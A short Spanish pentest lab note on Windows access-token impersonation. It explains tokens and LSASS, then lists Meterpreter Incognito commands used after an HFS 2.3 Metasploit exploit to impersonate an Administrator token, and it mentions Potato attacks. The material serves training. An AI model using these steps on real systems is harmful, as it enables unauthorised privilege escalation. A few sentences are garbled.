# Access Token Impersonation 

Tags: #WindowsAccessToken 

Windows Access Token son elementos Core del proceso de autenticación de Windows y son creados y manejados por Local Security Authority Subsystem Service (LSASS).
Windows Access Token es responsable de identificar y describir el contexto de seguridad de un proceso o amenaza que corre en un sistema. 
Los Access Token son generados por el **winlogon.exe**, proceso que cada cierto tiempo un usuario autentica satisfactoriamente. 

```bash 
# La vulnerabilidad HFS 2.3 es y la podemos explotar con Metasploit 

# Una vez adentro con Meterpreter debemos de ver los privilegios y encontrar el 'SeImpersonatePrivilege'
❯ load incognito               # Importamos el modulo de Incognito a la sesion de Meterpreter 
❯ list_tokens -u               # Lista los tokens de los usuarios 
❯ impersonate_token "ATTACKDEFENSE\Administrator" # Para elevar los privilegios al usuario 'administrador'

# Nota: Si no encontramos 'Delegation Tokens o Impersontion Tokens' podemos usar Potato attack
```